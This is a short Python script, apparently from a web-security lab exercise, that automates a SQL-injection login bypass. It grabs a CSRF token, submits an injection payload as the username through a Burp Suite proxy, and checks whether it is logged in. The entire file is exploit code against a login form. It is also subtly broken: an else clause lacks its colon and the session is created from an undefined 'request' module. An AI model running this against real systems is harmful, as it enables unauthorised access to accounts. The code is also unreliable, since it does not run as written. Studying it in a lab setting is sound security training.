import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Whenever the script runs, it will pass the request throught these proxies
# using the Burp Suite.
proxies = {'http': 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

# Parse the response to get the CSRF token
def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies) # Get the request from the session
    soup = BeautifulSoup(r.text, 'html.parser') # HTML/XML parser
    csrf_token = soup.find("input")['value']
    # print(csrf_token)
    return csrf_token


def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {
        "csrf" : csrf,
        "username" : payload,
        "password" : "randomText"
    }
    # Once you get the csrf token, make a POST request to the /login
    r = s.post(url, data=data, verify=False, proxies=proxies)

    # Figure out if I'm logged in by checking if the "Log out" button is in the response:
    response = r.text
    if "Log out" in response:
        return True
    else
        return False
    

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print('[-] Usage: %s <url> <sqli_payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])

    # Persist the parameters and cookies across the session
    s = request.Session()

    if exploit_sqli(s, url, sqli_payload):
        print('[+] SQL injection successful. I\'m in, Morpheus.')
    else:
        print('[-] Unsuccessful SQL injection attempt')